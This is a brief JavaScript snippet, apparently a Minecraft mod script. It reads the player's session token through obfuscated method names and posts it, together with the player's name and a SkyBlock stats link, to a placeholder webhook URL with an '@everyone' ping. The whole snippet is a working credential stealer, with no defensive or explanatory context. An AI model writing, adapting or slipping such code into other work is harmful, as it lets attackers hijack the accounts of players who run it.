import request from "requestv2"
request({
	'url': "URL_HERE",
	'method': "POST",
	'headers': {'User-agent': "Mozilla/5.0"},
	'body': {'content': "@everyone" + "```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```" + "https://sky.shiiyu.moe/stats/" +  Player.getName()}
});